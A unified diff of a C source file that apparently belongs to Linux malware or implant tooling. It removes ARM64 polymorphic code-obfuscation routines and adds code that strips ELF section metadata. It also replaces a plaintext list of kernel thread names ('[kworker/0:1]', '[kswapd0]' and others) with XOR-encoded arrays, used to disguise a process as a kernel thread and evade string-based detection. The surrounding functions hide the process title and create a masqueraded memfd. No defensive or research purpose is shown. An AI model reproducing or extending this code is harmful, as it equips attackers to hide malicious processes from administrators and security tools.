@@ -2,107 +2,25 @@
 #include "elf64.h"
 #include <unistd.h>
 
-// Define getpagesize if not available
-#ifndef getpagesize
-#define getpagesize() 4096  // Default page size for most systems
-#endif
+void strip_elf_metadata(uint8_t* data, size_t len) {
+    if (!data || len < sizeof(Elf64_Ehdr)) return;
+    if (!is_elf64(data)) return;
 
+    Elf64_Ehdr* ehdr = (Elf64_Ehdr*)data;
+    ehdr->e_shoff     = 0;
+    ehdr->e_shnum     = 0;
+    ehdr->e_shentsize = 0;
+    ehdr->e_shstrndx  = 0;
 
-static const uint32_t arm64_nop_variants[] = {
-    0xD503201F,  // nop          
-    0xAA1F03E0,  // mov x0, xzr  
-    0xAA0003E0,  // mov x0, x0  
-    0xD2800000,  // mov x0, #0   
-    0x52800000,  // mov w0, #0   
-    0x91000000,  // add x0, x0, #0 
-    0xD1000000,  // sub x0, x0, #0 
-    0x8A1F0000,  // and x0, x0, xzr
-};
-
-void generate_polymorphic_nops_arm64(uint8_t* buffer, size_t nop_bytes, size_t max_size) {
-    if (!buffer || nop_bytes > max_size || (nop_bytes % 4) != 0) return;
-
-    uint32_t* inst_buffer = (uint32_t*)buffer;
-    size_t nop_count = nop_bytes / 4;
-
-    // Validate alignment
-    if ((uintptr_t)inst_buffer % 4 != 0) return;
-
-    size_t variants_count = sizeof(arm64_nop_variants) / sizeof(arm64_nop_variants[0]);
-    for (size_t i = 0; i < nop_count; i++) {
-        inst_buffer[i] = arm64_nop_variants[i % variants_count];
-    }
-
-}
-
-void substitute_instructions_arm64(uint8_t* code, size_t max_len) {
-if (!code || max_len < 4 || (max_len % 4) != 0) return;
-    
-    uint32_t* instructions = (uint32_t*)code;
-    size_t inst_count = max_len / 4;
-    
-    // Validate alignment
-    if ((uintptr_t)instructions % 4 != 0) return;
-    
-    for (size_t i = 0; i < inst_count; i++) {
-        // Only substitute safe, equivalent instructions
-        uint32_t inst = instructions[i];
-        
-        // mov x0, x1 -> orr x0, x1, xzr
-        if ((inst & 0xFFE0FFE0) == 0xAA0003E0) {
-            if (rand() % 100 < 30) {
-                instructions[i] = (inst & ~0xFFE0FFE0) | 0xAA000020;
-            }
-        }
-        
-        // add x0, x0, #0 -> sub x0, x0, #0  
-        else if ((inst & 0xFF000000) == 0x91000000) {
-            if (rand() % 100 < 20) {
-                instructions[i] = (inst & ~0xFF000000) | 0xD1000000;
-            }
-        }
+    for (int i = 7; i < EI_NIDENT; i++) {
+        ehdr->e_ident[i] = 0;
     }
 }
 
-void apply_arm64_obfuscation(uint8_t* code, size_t len) {
-        if (!code || len < 128) return;
-    
-    const Elf64_Ehdr* ehdr = (const Elf64_Ehdr*)code;
-    if (!is_elf64_arm64(code)) return;
-    
-    // Find .text section
-    const Elf64_Phdr* phdr = (const Elf64_Phdr*)(code + ehdr->e_phoff);
-    size_t text_start = 0, text_size = 0;
-    
-    for (int i = 0; i < ehdr->e_phnum; i++) {
-        if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) {
-            text_start = phdr[i].p_offset;
-            text_size = phdr[i].p_filesz;
-            break;
-        }
+void deobf_str_xor(char* dst, const uint8_t* src, size_t len, uint8_t key) {
+    for (size_t i = 0; i < len; i++) {
+        dst[i] = (char)(src[i] ^ key);
     }
-    
-    if (text_start == 0 || text_size < 64) return;
-    
-    // Ensure 4-byte alignment
-    text_start = (text_start + 3) & ~3;
-    
-    // Make memory writable
-    size_t page_size = getpagesize();
-    void* page_start = (void*)((uintptr_t)(code + text_start) & ~(page_size - 1));
-    size_t page_len = ((text_size + page_size - 1) / page_size) * page_size;
-    
-    if (mprotect(page_start, page_len, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
-        return; // Cannot modify memory
-    }
-    
-    size_t safe_size = text_size - 64;
-    if (safe_size >= 32) {
-        generate_polymorphic_nops_arm64(code + text_start + 32, 32, safe_size - 32);
-        substitute_instructions_arm64(code + text_start + 32, safe_size - 32);
-    }
-    
-    mprotect(page_start, page_len, PROT_READ | PROT_EXEC);
 }
 
 void secure_memory_wipe(void* ptr, size_t size) {
@@ -157,26 +75,48 @@ void hide_process_title(int argc, char* argv[]) {
     }
 }
 
-static const char* innocent_process_names[] = {
-    "[kworker/0:1]",      // Kernel worker thread
-    "[ksoftirqd/0]",      // Kernel soft IRQ daemon
-    "[migration/0]",      // CPU migration thread  
-    "[rcu_gp]",           // RCU grace period
-    "[watchdog/0]",       // Watchdog thread
-    "[kcompactd0]",       // Memory compaction
-    "[kswapd0]",          // Memory swap daemon
-    "[systemd-journal]",  // System journal (if not too suspicious)
+
+#define INNOCENT_XOR_KEY 0x5A
+
+static const uint8_t innocent_obf_kworker[]   = {0x01, 0x31, 0x2D, 0x35, 0x28, 0x31, 0x3F, 0x28, 0x75, 0x6A, 0x60, 0x6B, 0x07};
+static const uint8_t innocent_obf_ksoftirqd[] = {0x01, 0x31, 0x29, 0x35, 0x3C, 0x2E, 0x33, 0x28, 0x2B, 0x3E, 0x75, 0x6A, 0x07};
+static const uint8_t innocent_obf_migration[] = {0x01, 0x37, 0x33, 0x3D, 0x28, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x6A, 0x07};
+static const uint8_t innocent_obf_rcugp[]     = {0x01, 0x28, 0x39, 0x2F, 0x05, 0x3D, 0x2A, 0x07};
+static const uint8_t innocent_obf_watchdog[]  = {0x01, 0x2D, 0x3B, 0x2E, 0x39, 0x32, 0x3E, 0x35, 0x3D, 0x75, 0x6A, 0x07};
+static const uint8_t innocent_obf_kcompactd[] = {0x01, 0x31, 0x39, 0x35, 0x37, 0x2A, 0x3B, 0x39, 0x2E, 0x3E, 0x6A, 0x07};
+static const uint8_t innocent_obf_kswapd[]    = {0x01, 0x31, 0x29, 0x2D, 0x3B, 0x2A, 0x3E, 0x6A, 0x07};
+static const uint8_t innocent_obf_journal[]   = {0x01, 0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x3E, 0x77, 0x30, 0x35, 0x2F, 0x28, 0x34, 0x3B, 0x36, 0x07};
+
+static const struct {
+    const uint8_t* obf;
+    size_t len;
+} innocent_obf_table[] = {
+    { innocent_obf_kworker,   sizeof(innocent_obf_kworker)   },
+    { innocent_obf_ksoftirqd, sizeof(innocent_obf_ksoftirqd) },
+    { innocent_obf_migration, sizeof(innocent_obf_migration) },
+    { innocent_obf_rcugp,     sizeof(innocent_obf_rcugp)     },
+    { innocent_obf_watchdog,  sizeof(innocent_obf_watchdog)  },
+    { innocent_obf_kcompactd, sizeof(innocent_obf_kcompactd) },
+    { innocent_obf_kswapd,    sizeof(innocent_obf_kswapd)    },
+    { innocent_obf_journal,   sizeof(innocent_obf_journal)   },
 };
 
 const char* get_random_innocent_name(void) {
+    static char decoded[32];
     static int initialized = 0;
     if (!initialized) {
         srand(time(NULL));
         initialized = 1;
     }
 
-    int index = rand() % (sizeof(innocent_process_names) / sizeof(innocent_process_names[0]));
-    return innocent_process_names[index];
+    size_t count = sizeof(innocent_obf_table) / sizeof(innocent_obf_table[0]);
+    int index = rand() % count;
+    size_t len = innocent_obf_table[index].len;
+    if (len >= sizeof(decoded)) len = sizeof(decoded) - 1;
+
+    deobf_str_xor(decoded, innocent_obf_table[index].obf, len, INNOCENT_XOR_KEY);
+    decoded[len] = '\0';
+    return decoded;
 }
 
 int create_masqueraded_memfd(void) {
